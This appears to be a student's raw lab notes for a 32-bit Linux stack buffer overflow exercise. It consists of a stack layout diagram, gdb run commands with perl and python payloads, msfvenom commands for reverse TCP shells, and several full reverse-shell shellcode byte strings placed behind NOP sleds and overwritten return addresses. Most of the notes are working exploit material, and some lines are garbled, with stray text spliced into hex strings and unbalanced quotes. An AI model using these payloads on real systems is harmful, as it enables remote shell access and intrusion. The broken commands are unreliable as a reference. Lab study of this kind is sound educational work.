##### Stack.c
bufSize => 4 bytes
a => 4 bytes
b => 4 bytes
buffer => 28 bytes


![[Pasted image 20250901215505.png]]
0x565562ed



0xffffcf0e


x`



gef➤  run $(perl -e 'print "\x90"x20, "\x0e\xcf\xff\xff"')


msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c


msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c -b "\x00\xff\x0a\x0d\x20"

run $(perl -e 'print "\x90"x28')


export SHELLCODE=$(perl -e 'print "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd".
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02".
"\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3".
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f".
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";')



printenv SHELLCODE | hexdump -C


msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c -b '\x00\x0a\x0d\x20'

           HIGH ADDRESSES
+-----------------------------+
| argv[1] (str)               | 0xffffcd5c
+-----------------------------+
| studentID = 35595108        | 0xffffcd58
+-----------------------------+
| Return Address              | 0xffffcd54  <--- OVERFLOW TARGET
+-----------------------------+
| Saved EBP                   | 0xffffcd50
+-----------------------------+
| a = 12 (0x0c)               | 0xffffcd4c
+-----------------------------+
| b = 18 (0x12)               | 0xffffcd48
+-----------------------------+
| bufSize = 16 (0x10)         | 0xffffcd44
+-----------------------------+
| (padding / alignment stuff) | 0xffffcd30–0xffffcd40
+-----------------------------+
| buffer[16]                  | 0xffffcd20–0xffffcd2f
|   • [0..3]  0x41414141 "AAAA"
|   • [4..7]  0x00000000
|   • [8..run $(perl -e 'print "\x90"x20')11] 0x00000000
|   • [12..15] 0x565561ca (spill)
+-----------------------------+
           LOW ADDRESSES


0xffffcd00

\x00\xcd\xff\xff
\x0f\x00\x00\x00
\x10\x00\x00\x00
\x12\x00\x00\x00
\x0c\x00\x00\x00

\xcc\x8f\x55\x56
\x50\xce\xff\xff
\x78\xcd\xff\xff
\xed\x62\x55\x56

run $(perl -e 'print "A"x28'. "\x01\xcd\xff\xff")



AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x01\xcd\xff\xff


"\x01\xcd\xff\xff\x0f\x00\x00\x00\x10\x00\x00\x00\x12\x00\x00\x00\x0c\x00\x00\x00\xcc\x8f\x55\x56\x50\xce\xff\xff\x78\xcd\xff\xff\xed\x62\x55\x56")

\x00\xcd\xff\xff\x0f\x00\x00\x00\x10\x00\x00\x00\x12\x00\x00\x00\x0c\x00\x00\x00\xcc\x8f\x55\x56\x50\xce\xff\xff\x78\xcd\xff\xff\xed\x62\x55\x56



\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80


run $(perl -e 'print "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"')



0xffffcd40


"\x31\xdb\xf7\xe3\
x53\x43\x53\x6a\
x02\x89\xe1\xb0\
x66\xcd\x80\x93\
x59\xb0\x3f\xcd\
x80\x49\x79\xf9\
x68\x0a\x00\x02
"\x0f\x68\x02\x00\
x11\x5c\x89\xe1\
xb0\x66\x50\x51\
x53\xb3\x03\x89\
xe1\xcd\x80\x52\
x68\x6e\x2f\x73\
x68\x68\x2f\x2f
\x62\x69\x89\xe3\
x52\x53\x89\xe1\
xb0\x0b\xcd\x80



https://samsclass.info/127/proj/ED203.htm



gdb --args ./stack "$(python3 -c 'import sys, struct; ret=0xffffcd5c; shell=(b"\x90"*16 + b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80")); pad=b"A"*(52-len(shell)); sys.stdout.buffer.write(shell+pad+struct.pack("<I",ret))")'




0xffffd045


0xffffd045




```
gdb --args stack "$(python3 -c 'print("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80")')" "$(python3 overflow.py)"



run $(perl -e 'print "\x90"x60, "\x45\xd0\xff\xff"')


```

bytes
unsigned char buf[] = 
"\xd9\xc5\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\xbe\xe3\x22"
"\xb5\x3e\x31\x72\x17\x03\x72\x17\x83\x09\xde\x57\xcb\xfc"
"\xc4\x6f\xd7\xad\xb9\xdc\x72\x53\xb7\x02\x32\x35\x0a\x44"
"\xa0\xe0\x24\x7a\x0a\x92\x0c\xfc\x6d\xfa\x84\xfe\x8f\xf5"
"\xf0\xfc\x8f\x18\x5d\x88\x71\xaa\x3b\xda\x20\x99\x70\xd9"
"\x4b\xfc\xba\x5e\x19\x96\x2a\x70\xed\x0e\xdb\xa1\x3e\xac"
"\x72\x37\xa3\x62\xd6\xce\xc5\x32\xd3\x1d\x85";


env -i SHELLCODE=$(printf '\xd9\xc5\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x12\xbe\xe3\x22\xb5\x3e\x31\x72\x17\x03\x72\x17\x83\x09\xde\x57\xcb\xfc\xc4\x6f\xd7\xad\xb9\xdc\x72\x53\xb7\x02\x32\x35\x0a\x44\xa0\xe0\x24\x7a\x0a\x92\x0c\xfc\x6d\xfa\x84\xfe\x8f\xf5\xf0\xfc\x8f\x18\x5d\x88\x71\xaa\x3b\xda\x20\x99\x70\xd9\x4b\xfc\xba\x5e\x19\x96\x2a\x70\xed\x0e\xdb\xa1\x3e\xac\x72\x37\xa3\x62\xd6\xce\xc5\x32\xd3\x1d\x85') ./vulnerable_program $(perl -e 'print "\x90"x24 . "<ADDR>"')



0xffffcd10



run $(perl -e 'print"A"x60')

0xffffd058

\x56\xd0\xff\xff

0xffffcee4


run $(perl -e 'print"\x90"x28, "\xb8\x27\xca\x51\xb6\xdb\xc5\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x12\x31\x45\x12\x83\xc5\x04\x03\x62\xc4\xb3\x43\x5d\x03\xc4\x4f\xce\xf0\x78\xfa\xf2\x7f\x9f\x4a\x94\xb2\xe0\x38\x01\xfd\xde\xf3\x31\xb4\x59\xf5\x59\x4d\x9a\x07\x96\x39\x98\x07\xb9\xe5\x15\xe6\x09\x73\x76\xb8\x3a\xcf\x75\xb3\x5d\xe2\xfa\x91\xf5\x93\xd5\x66\x6d\x04\x05\xa6\x0f\xbd\xd0\x5b\x9d\x6e\x6a\x7a\x91\x9a\xa1\xfd","\xe4\xce\xff\xff"')


run $(perl -e 'print"\x90"x60,"\xe4\xce\xff\xff"') "\xb8\x27\xca\x51\xb6\xdb\xc5\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x12\x31\x45\x12\x83\xc5\x04\x03\x62\xc4\xb3\x43\x5d\x03\xc4\x4f\xce\xf0\x78\xfa\xf2\x7f\x9f\x4a\x94\xb2\xe0\x38\x01\xfd\xde\xf3\x31\xb4\x59\xf5\x59\x4d\x9a\x07\x96\x39\x98\x07\xb9\xe5\x15\xe6\x09\x73\x76\xb8\x3a\xcf\x75\xb3\x5d\xe2\xfa\x91\xf5\x93\xd5\x66\x6d\x04\x05\xa6\x0f\xbd\xd0\x5b\x9d\x6e\x6a\x7a\x91\x9a\xa1\xfd"



\xb8\x27\xca\x51\xb6\xdb\xc5\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x12\x31\x45\x12\x83\xc5\x04\x03\x62\xc4\xb3\x43\x5d\x03\xc4\x4f\xce\xf0\x78\xfa\xf2\x7f\x9f\x4a\x94\xb2\xe0\x38\x01\xfd\xde\xf3\x31\xb4\x59\xf5\x59\x4d\x9a\x07\x96\x39\x98\x07\xb9\xe5\x15\xe6\x09\x73\x76\xb8\x3a\xcf\x75\xb3\x5d\xe2\xfa\x91\xf5\x90xffffd0553\xd5\x66\x6d\x04\x05\xa6\x0f\xbd\xd0\x5b\x9d\x6e\x6a\x7a\x91\x9a\xa1\xfd";


run $(perl -e 'print "\x90"x28 . "\xe4\xce\xff\xff"') "$(perl -e 'print "\xb8\x27\xca\x51\xb6\xdb\xc5\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x12\x31\x45\x12\x83\xc5\x04\x03\x62\xc4\xb3\x43\x5d\x03\xc4\x4f\xce\xf0\x78\xfa\xf2\x7f\x9f\x4a\x94\xb2\xe0\x38\x01\xfd\xde\xf3\x31\xb4\x59\xf5\x59\x4d\x9a\x07\x96\x39\x98\x07\xb9\xe5\x15\xe6\x09\x73\x76\xb8\x3a\xcf\x75\xb3\x5d\xe2\xfa\x91\xf5\x93\xd5\x66\x6d\x04\x05\xa6\x0f\xbd\xd0\x5b\x9d\x6e\x6a\x7a\x91\x9a\xa1\xfd"') 


run $(perl -e 'print "\x90"x71 . "\x30\xcd\xff\xff". 'print "\x90"x96 ."\xb8\x27\xca\x51\xb6\xdb\xc5\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x12\x31\x45\x12\x83\xc5\x04\x03\x62\xc4\xb3\x43\x5d\x03\xc4\x4f\xce\xf0\x78\xfa\xf2\x7f\x9f\x4a\x94\xb2\xe0\x38\x01\xfd\xde\xf3\x31\xb4\x59\xf5\x59\x4d\x9a\x07\x96\x39\x98\x07\xb9\xe5\x15\xe6\x09\x73\x76\xb8\x3a\xcf\x75\xb3\x5d\xe2\xfa\x91\xf5\x93\xd5\x66\x6d\x04\x05\xa6\x0f\xbd\xd0\x5b\x9d\x6e\x6a\x7a\x91\x9a\xa1\xfd"') 

"\xb8\x27\xca\x51\xb6\xdb\xc5\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x12\x31\x45\x12\x83\xc5\x04\x03\x62\xc4\xb3\x43\x5d\x03\xc4\x4f\xce\xf0\x78\xfa\xf2\x7f\x9f\x4a\x94\xb2\xe0\x38\x01\xfd\xde\xf3\x31\xb4\x59\xf5\x59\x4d\x9a\x07\x96\x39\x98\x07\xb9\xe5\x15\xe6\x09\x73\x76\xb8\x3a\xcf\x75\xb3\x5d\xe2\xfa\x91\xf5\x93\xd5\x66\x6d\x04\x05\xa6\x0f\xbd\xd0\x5b\x9d\x6e\x6a\x7a\x91\x9a\xa1\xfd"



run $(perl -e 'print "\x90"x71 . "\xe4\xcd\xff\xff"') $(perl -e 'print "\x90"x9run $(perl -e 'print "A"x60)6 . "\xe4\xce\xff\xff"')


run $(perl -e 'print"\x90"x60, "\xe4\xce\xff\xff")


"$(cat payload_final)"



run $(perl -e 'print "\x90"x60 . "\xe4\xce\xff\xff"') "$(cat payload_final)"



"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02"
"\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3"
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";


msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c -b '\x00'


"\xb8\xc2\x42\x48\x68\xd9\xec\xd9\x74\x24\xf4\x5b\x2b\xc9"
"\xb1\x12\x31\x43\x12\x83\xc3\x04\x03\x81\x4c\xaa\x9d\x34"
"\x8a\xdd\xbd\x65\x6f\x71\x28\x8b\xe6\x94\x1c\xed\x35\xd6"
"\xce\xa8\x75\xe8\x3d\xca\x3f\x6e\x47\xa2\xb5\x90\xb5\x3d"
"\xa2\x92\xb9\x50\x6e\x1a\x58\xe2\xe8\x4c\xca\x51\x46\x6f"
"\x65\xb4\x65\xf0\x27\x5e\x18\xde\xb4\xf6\x8c\x0f\x14\x64"
"\x24\xd9\x89\x3a\xe5\x50\xac\x0a\x02\xae\xaf";




90x76, memory, 90 again payloadx64
6
9+12 -> 21
16 

71


9 -> 76
6 -> 73



run $(perl -e 'print "\x90"x60 , "\x20\xcd\xff\xff", print "\x90"x96,"\xb8\x27\xca\x51\xb6\xdb\xc5\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\xx9612\x31\x45\x12\x83\xc5\x04\x03\x62\xc4\xb3\x43\x5d\x03\xc4\x4f\xce\xf0\x78\xfa\xf2\x7f\x9f\x4a\x94\xb2\xe0\x38\x01\xfd\xde\xf3\x31\xb4\x59\xf5\x59\x4d\x9a\x07\x96\x39\x98\x07\xb9\xe5\x15\xe6\x09\x73\x76\xb8\x3a\xcf\x75\xb3\x5d\xe2\xfa\x91\xf5\x93\xd5\x66\x6d\x04\x05\xa6\x0f\xbd\xd0\x5b\x9d\x6e\x6a\x7a\x91\x9a\xa1\xfd"') 




run $(perl -e 'print "A"x60')


return address on 61-64
need 60 nops + 4 original return address + 96 bvytes of nop+ 95 bytes of shellcode

"\xbd\xae\x12\x0d\x74\xda\xdb\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x12\x31\x6f\x12\x03\x6f\x12\x83\x69\x16\xef\x81\x44\xcc\x18\x8a\xf5\xb1\xb5\x27\xfb\xbc\xdb\x08\x9d\x73\x9b\xfa\x38\x3c\xa3\x31\x3a\x75\xa5\x30\x52\x8c\x55\xc1\xad\xf8\x57\xc5\xa0\xa4\xde\x24\x72\x32\xb1\xf7\x21\x08\x32\x71\x24\xa3\xb5\xd3\xce\x52\x99\xa0\x66\xc3\xca\x69\x14\x7a\x9c\x95\x8a\x2f\x17\xb8\x9a\xdb\xea\xbb"




run $(perl -e 'print "\x90"x72 , "\x80\xcc\xff\xff", print "\x90"x96,"\xbd\xae\x12\x0d\x74\xda\xdb\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x12\x31\x6f\x12\x03\x6f\x12\x83\x69\x16\xef\x81\x44\xcc\x18\x8a\xf5\xb1\xb5\x27\xfb\xbc\xdb\x08\x9d\x73\x9b\xfa\x38\x3c\xa3\x31\x3a\x75\xa5\x30\x52\x8c\x55\xc1\xad\xf8\x57\xc5\xa0\xa4\xde\x24\x72\x32\xb1\xf7\x21\x08\x32\x71\x24\xa3\xb5\xd3\xce\x52\x99\xa0\x66\xc3\xca\x69\x14\x7a\x9c\x95\x8a\x2f\x17\xb8\x9a\xdb\xea\xbb"')

run $(perl -e 'print "\x90"x60 , "\x30\xcd\xff\xff"')